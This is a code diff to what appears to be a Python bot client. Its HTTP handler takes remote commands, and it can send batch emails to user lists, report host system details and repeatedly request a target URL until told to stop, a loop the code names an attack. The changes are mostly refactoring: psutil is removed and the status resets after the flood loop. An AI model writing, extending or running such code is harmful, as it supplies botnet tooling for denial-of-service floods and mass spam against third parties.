@@ -4,12 +4,10 @@ import smtplib
 import ssl
 import threading
 from email.mime.text import MIMEText
-
-import psutil
 from http.server import BaseHTTPRequestHandler
 import requests
 
-target="-"
+target = "-"
 action = "waiting"
 event = threading.Event()
 
@@ -49,7 +47,6 @@ class HTTPServerRH(BaseHTTPRequestHandler):
     def do_POST(self):
         global target
         global action
-        global event
 
         contentLength = int(self.headers['Content-Length'])
         postData = self.rfile.read(contentLength).decode("utf-8")
@@ -93,13 +90,15 @@ def batchEmail(oggetto, message, utenti):
     except Exception as e:
         print(e)
     target = len(ut) if ut is not None else len(utenti)
-    action = "Sending email to " + str(target)+ " users"
+    action = "Sending email to " + str(target) + " users"
     return target, action
 
 
 def execRequest(url, time):
     global target
     global action
+    global event
+    event.clear()
     try:
         p = threading.Thread(target=doRequest, args=(url, int(time)))
         p.daemon = True
@@ -123,8 +122,6 @@ def stopAttack():
 def getSystemInfo():
     try:
         uname = platform.uname()
-        svmem = psutil.virtual_memory()
-        partition = psutil.disk_partitions()
         message = {
             "System": uname.system,
             "Node name": uname.node,
@@ -132,9 +129,6 @@ def getSystemInfo():
             "Version": uname.version,
             "Machine": uname.machine,
             "Processor": platform.processor(),
-            "Physical cores": psutil.cpu_count(logical=False),
-            "Total cores": psutil.cpu_count(logical=True),
-            "Memory": get_size(svmem.total),
         }
         return json.dumps(message)
     except Exception as e:
@@ -143,17 +137,21 @@ def getSystemInfo():
 
 
 def doRequest(url, time):
+    global target
+    global action
     global event
     i = 0
     while (i < time or time == -1) and not event.is_set():
         try:
             print("Get to", url, end="")
             response = requests.get(url)
+            print("")
         except Exception as e:
             print(" Request error:", url, "is not reachable")
         if time != -1:
             i += 1
-    event.clear()
+    target = "-"
+    action = "waiting"
 
 
 def sendEmail(oggetto, message, utenti):
@@ -178,4 +176,6 @@ def sendEmail(oggetto, message, utenti):
 
 
 def getStatus():
+    global target
+    global action
     return target, action
